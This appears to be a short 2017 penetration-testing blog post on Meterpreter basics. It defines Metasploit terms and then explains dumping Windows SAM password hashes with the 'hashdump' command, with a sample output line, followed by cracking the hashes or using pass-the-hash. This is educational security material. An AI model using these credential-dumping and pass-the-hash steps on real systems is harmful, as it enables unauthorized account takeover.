Meterpreter Basics

Posted on 2017-12-03 | In Penetration Test | Visitors

Let’s know something basic before we start. You can skip the following if you are familiar with them.

Terminology

  • Exploit (An exploit is the means by which an attacker, or pen tester for that matterk takes advantage of a flaw within a system, an application, or a service.)
  • Payload (A payload is code that we want the system to execute and that is to be selected and delivered by the Framework) For example, a reverse shell is a payload that creates a connection from the target machine back to the attacker as a Windows command prompt, whereas a bind shell is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect.
  • Shellcode (Shellcode is a set of instructions used as a payload when exploitation occurs.)
  • Module (A module in the context of this book is a piece of software that can be used by the Metasploit Framework)
  • Listener (A Listener is a component within Metasploit that waits for an incoming connection of some sort.)
  • Resource Files (Resource files are script files that automate commands within msfconsole. They contain a list of commands that are executed from msfconsole and run sequentially) For example, msfconsole -r filename.rc

Hash Dump

If we exploit a windows machine in the penetration test, the next step is how to get the administrative privileges. Here are some tips.

Try to dump the usernames and passwords. Because the module priv is integrated into the meterpreter . So what you need to do is just type the chars hashdump. You will see the following.

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Remember that the hash value starts with aad3b435 is simply an empty or null hash value — a placeholder for an empty string. Besides that we should know that we must run as SYSTEM to get around the registry restrictions and dump the protected the selected SAM(Security Account Manager) storage that contains Windows usernames and passwords.

What should I do after I got the hash value? Of course, you can use the rainbow table to crack the hash password. We can pass the hash value to login if we can’t crack the hash value just like the normal logon.
